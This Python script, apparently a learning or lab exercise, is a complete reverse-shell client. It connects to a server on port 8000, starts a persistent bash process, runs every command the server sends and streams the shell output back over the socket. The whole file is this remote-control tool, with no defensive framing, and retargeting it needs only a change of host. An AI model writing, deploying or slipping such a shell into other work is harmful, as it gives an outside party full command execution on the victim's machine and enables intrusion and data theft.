import socket
import subprocess
import threading


def client_program():
    host = socket.gethostname()
    port = 8000

    client_socket = socket.socket()
    client_socket.connect((host, port))
    data = client_socket.recv(4096).decode()
    print(data)

    # Start a persistent bash shell
    shell = subprocess.Popen(
        ["/bin/bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )

    def read_shell():
        """Read continuous output from bash and send to server."""
        for line in shell.stdout:
            client_socket.sendall(line.encode())

    threading.Thread(target=read_shell, daemon=True).start()


    while True:
        cmd = client_socket.recv(1024).decode().strip()
        if not cmd:
            break
        if cmd.lower()=="exit":
            break

        shell.stdin.write(cmd + "\n")
        shell.stdin.flush()

    client_socket.close()
    shell.terminate()





if __name__ == '__main__':
    client_program()
